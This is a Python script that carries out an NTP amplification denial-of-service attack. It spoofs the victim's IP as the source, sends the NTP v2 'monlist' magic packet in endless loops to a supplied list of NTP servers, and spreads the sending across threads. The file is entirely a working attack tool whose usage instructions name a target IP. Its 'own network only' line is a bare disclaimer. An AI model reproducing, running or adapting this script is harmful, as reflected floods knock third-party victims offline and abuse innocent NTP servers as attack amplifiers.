#!/usr/bin/env python
import sys
import threading
import time
import random	# For Random source port
#NTP Amp DOS attack
#by DaRkReD
#usage ntpdos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
#FOR USE ON YOUR OWN NETWORK ONLY

# Random source port added by JDMoore0883

#packet sender
def deny():
	#Import globals to function
	global ntplist
	global currentserver
	global data
	global target
	ntpserver = ntplist[currentserver] #Get new server
	currentserver = currentserver + 1 #Increment for next 
	packet = IP(dst=ntpserver,src=target)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data) #BUILD IT
	send(packet,loop=1) #SEND IT

#So I dont have to have the same stuff twice
def printhelp():
	print ("NTP Amplification DOS Attack")
	print ("By DaRkReD")
	print ("Usage ntpdos.py <target ip> <ntpserver list> <number of threads>")
	print ("ex: ex: ntpdos.py 1.2.3.4 file.txt 10")
	print ("NTP serverlist file should contain one IP per line")
	print ("MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS")
	exit(0)

try:
	if len(sys.argv) < 4:
		printhelp()
	#Fetch Args
	target = sys.argv[1]

	#Help out idiots
	if target in ("help","-h","h","?","--h","--help","/?"):
		printhelp()

	ntpserverfile = sys.argv[2]
	numberthreads = int(sys.argv[3])
	#System for accepting bulk input
	ntplist = []
	currentserver = 0
	with open(ntpserverfile) as f:
	    ntplist = f.readlines()

	#Make sure we dont out of bounds
	if  numberthreads > int(len(ntplist)):
		print ("Attack Aborted: More threads than servers")
		print ("Next time dont create more threads than servers")
		exit(0)

	#Magic Packet aka NTP v2 Monlist Packet
	data = "\x17\x00\x03\x2a" + "\x00" * 4

	#Hold our threads
	threads = []
	print ("Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads")
	print ("Use CTRL+C to stop attack")

	#Thread spawner
	for n in range(numberthreads):
	    thread = threading.Thread(target=deny)
	    thread.daemon = True
	    thread.start()

	    threads.append(thread)

	#In progress!
	print ("Sending...")

	#Keep alive so ctrl+c still kills all them threads
	while True:
		time.sleep(1)
except KeyboardInterrupt:
	print("Script Stopped [ctrl + c]... Shutting down")
# Script ends here